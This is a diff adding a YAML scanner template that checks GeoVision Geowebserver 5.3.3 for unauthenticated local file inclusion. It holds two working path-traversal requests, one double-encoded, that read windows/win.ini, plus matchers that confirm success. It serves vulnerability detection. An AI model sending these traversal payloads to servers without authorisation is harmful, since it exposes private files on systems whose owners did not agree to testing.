@@ -1,0 +1,30 @@
+id: geowebserver-lfi
+name: GeoVision Geowebserver 5.3.3 - Local File Inclusion
+severity: high
+confidence: tentative
+description: GeoVision Geowebserver 5.3.3 allows remote unauthenticated attackers to disclose the content of locally stored
+  files via local file inclusion.
+reference: CWE-22
+tags:
+- packetstorm
+- geowebserver
+- lfi
+- xss
+- vuln
+requests:
+- method: GET
+  path: /Visitor//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows%5Cwin.ini
+  matchers: &id001
+  - type: body
+    words:
+    - bit app support
+    - fonts
+    - extensions
+  - type: status
+    status:
+    - 200
+  condition: and
+- method: GET
+  path: /Visitor/bin/WebStrings.srf?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini&obj_name=aaa
+  matchers: *id001
+  condition: and
